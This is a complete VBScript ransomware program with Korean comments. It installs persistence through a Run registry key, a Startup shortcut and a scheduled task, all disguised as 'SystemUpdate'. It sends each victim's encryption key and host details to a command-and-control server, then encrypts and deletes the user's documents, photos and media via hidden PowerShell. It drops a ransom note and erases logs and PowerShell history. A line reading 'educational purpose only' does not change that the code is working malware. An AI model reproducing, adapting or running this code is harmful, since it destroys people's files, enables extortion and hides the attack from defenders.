Option Explicit

' 전역 변수
Dim objShell, objFSO, objHTTP
Dim ENCRYPTION_KEY, IS_FIRST_RUN
Dim TARGET_EXTENSIONS
Dim C2_SERVER

' C2 서버 설정
C2_SERVER = "http://192.168.202.44:8081"

' 암호화 대상 확장자
TARGET_EXTENSIONS = Array( _
    ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", _
    ".pdf", ".jpg", ".jpeg", ".png", ".gif", ".bmp", _
    ".mp3", ".mp4", ".avi", ".mkv", ".zip", ".rar", _
    ".sql", ".mdb", ".csv", ".xml", ".json" _
)

' 메인 함수
Sub Main()
    On Error Resume Next
    
    Set objShell = CreateObject("WScript.Shell")
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    
    IS_FIRST_RUN = CheckFirstRun()
    
    If IS_FIRST_RUN Then
        ' 첫 실행: 지속성만 설치
        Call InstallPersistence
        Call MarkAsInstalled
        LogMessage "Installed persistence. Waiting for reboot..."
    Else
        ' 재부팅 후
        LogMessage "Reboot detected. Generating encryption key..."
        
        ' 1. 키 생성
        ENCRYPTION_KEY = GenerateEncryptionKey()
        LogMessage "Generated key (not saved locally)"
        
        ' 2. 키를 C2 서버로만 전송 (로컬 저장 안 함)
        Call SendKeyToC2(ENCRYPTION_KEY)
        
        ' 3. 암호화 실행
        LogMessage "Starting encryption..."
        Call EncryptUserFiles
        
        ' 4. 랜섬 노트
        Call CreateRansomNote
        
        ' 5. 로그 삭제 (흔적 제거)
        Call CleanupTraces
        
        LogMessage "Encryption completed."
    End If
    
    Set objShell = Nothing
    Set objFSO = Nothing
    Set objHTTP = Nothing
End Sub

' ====================================
' 타임스탬프 기반 키 생성
' ====================================
Function GenerateEncryptionKey()
    On Error Resume Next
    
    Dim timestamp, computerName, userName, randomPart
    Dim keyData, hashedKey
    
    timestamp = FormatDateTime(Now(), vbGeneralDate)
    computerName = objShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    userName = objShell.ExpandEnvironmentStrings("%USERNAME%")
    
    Randomize
    randomPart = Int((999999 - 100000 + 1) * Rnd + 100000)
    
    keyData = Replace(timestamp, " ", "") & "_" & computerName & "_" & userName & "_" & randomPart
    hashedKey = HashSHA256(keyData)
    
    GenerateEncryptionKey = Left(hashedKey, 32)
End Function

' ====================================
' SHA256 해시 생성
' ====================================
Function HashSHA256(inputString)
    On Error Resume Next
    
    Dim psCmd, tempFile, hashedValue
    
    tempFile = objShell.ExpandEnvironmentStrings("%TEMP%\hash_output.txt")
    
    psCmd = "powershell.exe -WindowStyle Hidden -Command """ & _
            "$hash = [System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes('" & inputString & "'));" & _
            "$hashString = [System.BitConverter]::ToString($hash) -replace '-','';" & _
            "$hashString | Out-File -FilePath '" & tempFile & "' -Encoding ASCII -NoNewline" & _
            """"
    
    objShell.Run psCmd, 0, True
    
    If objFSO.FileExists(tempFile) Then
        Dim file
        Set file = objFSO.OpenTextFile(tempFile, 1)
        hashedValue = file.ReadAll
        file.Close
        Set file = Nothing
        
        objFSO.DeleteFile tempFile, True
    End If
    
    HashSHA256 = hashedValue
End Function

' ====================================
' 키를 C2로만 전송 (로컬 저장 제거)
' ====================================
Sub SendKeyToC2(key)
    On Error Resume Next
    
    Dim uploadUrl, victimData
    Dim computerName, userName, osVersion, localIP
    
    computerName = objShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    userName = objShell.ExpandEnvironmentStrings("%USERNAME%")
    osVersion = GetOSVersion()
    localIP = GetLocalIP()
    
    victimData = "========================================" & vbCrLf
    victimData = victimData & "NEW VICTIM ENCRYPTED" & vbCrLf
    victimData = victimData & "========================================" & vbCrLf
    victimData = victimData & "Timestamp: " & Now() & vbCrLf
    victimData = victimData & "Computer: " & computerName & vbCrLf
    victimData = victimData & "User: " & userName & vbCrLf
    victimData = victimData & "OS: " & osVersion & vbCrLf
    victimData = victimData & "IP: " & localIP & vbCrLf
    victimData = victimData & "Encryption Key: " & key & vbCrLf
    victimData = victimData & "========================================" & vbCrLf
    
    uploadUrl = C2_SERVER & "/upload/key"
    
    objHTTP.Open "POST", uploadUrl, False
    objHTTP.setRequestHeader "Content-Type", "text/plain"
    objHTTP.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    objHTTP.Send victimData
    
    If objHTTP.Status = 200 Then
        LogMessage "Key sent to C2 successfully (NOT saved locally)"
    Else
        LogMessage "Failed to send key. Key is LOST!"
        ' 주의: C2 전송 실패 시 키가 영구적으로 손실됨
    End If
End Sub

' ====================================
' 첫 실행 여부 확인
' ====================================
Function CheckFirstRun()
    On Error Resume Next
    
    Dim markerPath
    markerPath = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\.installed")
    
    CheckFirstRun = Not objFSO.FileExists(markerPath)
End Function

' ====================================
' 설치 완료 마커
' ====================================
Sub MarkAsInstalled()
    On Error Resume Next
    
    Dim markerPath, markerFile
    markerPath = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\.installed")
    
    Set markerFile = objFSO.CreateTextFile(markerPath, True)
    markerFile.WriteLine Now()
    markerFile.Close
    Set markerFile = Nothing
    
    objShell.Run "attrib +h """ & markerPath & """", 0, True
End Sub

' ====================================
' 지속성 설치
' ====================================
Sub InstallPersistence()
    On Error Resume Next
    
    Dim agentPath, targetPath
    
    agentPath = WScript.ScriptFullName
    targetPath = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\SystemUpdate.vbs")
    
    If agentPath <> targetPath Then
        objFSO.CopyFile agentPath, targetPath, True
    End If
    
    objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate", _
                      "wscript.exe """ & targetPath & """", "REG_SZ"
    
    Call CreateStartupShortcut(targetPath)
    Call CreateStartupTask(targetPath)
    
    LogMessage "Persistence installed"
End Sub

Sub CreateStartupShortcut(targetPath)
    On Error Resume Next
    
    Dim startupFolder, lnkPath, objShortcut
    
    startupFolder = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    lnkPath = startupFolder & "\SystemUpdate.lnk"
    
    Set objShortcut = objShell.CreateShortcut(lnkPath)
    objShortcut.TargetPath = "wscript.exe"
    objShortcut.Arguments = """" & targetPath & """"
    objShortcut.WindowStyle = 7
    objShortcut.Save
    
    Set objShortcut = Nothing
End Sub

Sub CreateStartupTask(targetPath)
    On Error Resume Next

    Dim taskCmd

    taskCmd = "schtasks /create /tn ""SystemUpdate"" /tr ""wscript.exe " & Chr(34) & targetPath & Chr(34) & """ /sc onstart /rl highest /f"

    objShell.Run taskCmd, 0, True
End Sub

' ====================================
' 암호화 로직
' ====================================
Sub EncryptUserFiles()
    On Error Resume Next
    
    Dim targetFolders, i
    
    targetFolders = Array( _
        objShell.ExpandEnvironmentStrings("%USERPROFILE%\Desktop"), _
        objShell.ExpandEnvironmentStrings("%USERPROFILE%\Documents"), _
        objShell.ExpandEnvironmentStrings("%USERPROFILE%\Pictures"), _
        objShell.ExpandEnvironmentStrings("%USERPROFILE%\Music"), _
        objShell.ExpandEnvironmentStrings("%USERPROFILE%\Videos"), _
        objShell.ExpandEnvironmentStrings("%USERPROFILE%\Downloads") _
    )
    
    For i = 0 To UBound(targetFolders)
        If objFSO.FolderExists(targetFolders(i)) Then
            Call EncryptFolder(targetFolders(i))
        End If
    Next
End Sub

Sub EncryptFolder(folderPath)
    On Error Resume Next
    
    Dim folder, file, subFolder
    
    Set folder = objFSO.GetFolder(folderPath)
    
    For Each file In folder.Files
        If ShouldEncrypt(file.Path) Then
            Call EncryptFile(file.Path)
        End If
    Next
    
    For Each subFolder In folder.SubFolders
        If Not IsSystemFolder(subFolder.Path) Then
            Call EncryptFolder(subFolder.Path)
        End If
    Next
    
    Set folder = Nothing
End Sub

Function ShouldEncrypt(filePath)
    On Error Resume Next
    
    Dim ext, i
    
    If Right(filePath, 10) = ".encrypted" Then
        ShouldEncrypt = False
        Exit Function
    End If
    
    ext = LCase(objFSO.GetExtensionName(filePath))
    If Len(ext) > 0 Then ext = "." & ext
    
    For i = 0 To UBound(TARGET_EXTENSIONS)
        If ext = TARGET_EXTENSIONS(i) Then
            ShouldEncrypt = True
            Exit Function
        End If
    Next
    
    ShouldEncrypt = False
End Function

Function IsSystemFolder(folderPath)
    On Error Resume Next
    
    Dim excludePaths
    excludePaths = Array("AppData", "Application Data", "$Recycle.Bin", "System Volume Information")
    
    Dim i
    For i = 0 To UBound(excludePaths)
        If InStr(1, folderPath, excludePaths(i), vbTextCompare) > 0 Then
            IsSystemFolder = True
            Exit Function
        End If
    Next
    
    IsSystemFolder = False
End Function

Sub EncryptFile(filePath)
    On Error Resume Next
    
    Dim psCmd, encryptedPath
    
    encryptedPath = filePath & ".encrypted"
    
    psCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & _
            "$key = [System.Text.Encoding]::UTF8.GetBytes('" & ENCRYPTION_KEY & "'.PadRight(32).Substring(0,32));" & _
            "$aes = [System.Security.Cryptography.Aes]::Create();" & _
            "$aes.Key = $key;" & _
            "$aes.GenerateIV();" & _
            "$iv = $aes.IV;" & _
            "$encryptor = $aes.CreateEncryptor();" & _
            "$plainBytes = [System.IO.File]::ReadAllBytes('" & filePath & "');" & _
            "$encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length);" & _
            "$result = $iv + $encryptedBytes;" & _
            "[System.IO.File]::WriteAllBytes('" & encryptedPath & "', $result);" & _
            "$aes.Dispose();" & _
            "Remove-Item '" & filePath & "' -Force" & _
            """"
    
    objShell.Run psCmd, 0, True
End Sub

' ====================================
' 랜섬 노트
' ====================================
Sub CreateRansomNote()
    On Error Resume Next
    
    Dim notePath, noteFile, noteContent
    
    notePath = objShell.ExpandEnvironmentStrings("%USERPROFILE%\Desktop\README_DECRYPT.txt")
    
    noteContent = "========================================" & vbCrLf
    noteContent = noteContent & "YOUR FILES HAVE BEEN ENCRYPTED!" & vbCrLf
    noteContent = noteContent & "========================================" & vbCrLf & vbCrLf
    noteContent = noteContent & "All your documents, photos, and files" & vbCrLf
    noteContent = noteContent & "have been encrypted with AES-256." & vbCrLf & vbCrLf
    noteContent = noteContent & "The encryption key is NOT stored locally." & vbCrLf
    noteContent = noteContent & "Only the attacker has your key." & vbCrLf & vbCrLf
    noteContent = noteContent & "Victim ID: " & objShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & "_" & objShell.ExpandEnvironmentStrings("%USERNAME%") & vbCrLf
    noteContent = noteContent & "Encrypted: " & Now() & vbCrLf & vbCrLf
    noteContent = noteContent & "========================================" & vbCrLf
    noteContent = noteContent & "EDUCATIONAL PURPOSE ONLY!" & vbCrLf
    noteContent = noteContent & "Contact administrator for recovery" & vbCrLf
    noteContent = noteContent & "========================================" & vbCrLf
    
    Set noteFile = objFSO.CreateTextFile(notePath, True)
    noteFile.Write noteContent
    noteFile.Close
    Set noteFile = Nothing
    
    objShell.Run "notepad.exe """ & notePath & """", 1, False
End Sub

' ====================================
' 흔적 제거
' ====================================
Sub CleanupTraces()
    On Error Resume Next
    
    ' 로그 파일 삭제
    Dim logPath
    logPath = objShell.ExpandEnvironmentStrings("%TEMP%\crypto_log.txt")
    
    If objFSO.FileExists(logPath) Then
        objFSO.DeleteFile logPath, True
    End If
    
    ' PowerShell 히스토리 삭제
    objShell.Run "powershell.exe -W Hidden -C ""Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue""", 0, True
    
    ' 이벤트 로그 일부 삭제 (관리자 권한 필요)
    objShell.Run "wevtutil.exe cl ""Windows PowerShell""", 0, False
End Sub

' ====================================
' 유틸리티 함수
' ====================================
Function GetOSVersion()
    On Error Resume Next
    GetOSVersion = objShell.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")
End Function

Function GetLocalIP()
    On Error Resume Next
    
    Dim objWMI, colItems, objItem
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
    
    For Each objItem In colItems
        If Not IsNull(objItem.IPAddress) Then
            GetLocalIP = objItem.IPAddress(0)
            Exit For
        End If
    Next
    
    Set colItems = Nothing
    Set objWMI = Nothing
End Function

Sub LogMessage(message)
    On Error Resume Next
    
    Dim logPath, logFile
    logPath = objShell.ExpandEnvironmentStrings("%TEMP%\crypto_log.txt")
    
    Set logFile = objFSO.OpenTextFile(logPath, 8, True)
    logFile.WriteLine Now() & " - " & message
    logFile.Close
    Set logFile = Nothing
End Sub

' 프로그램 시작
Call Main()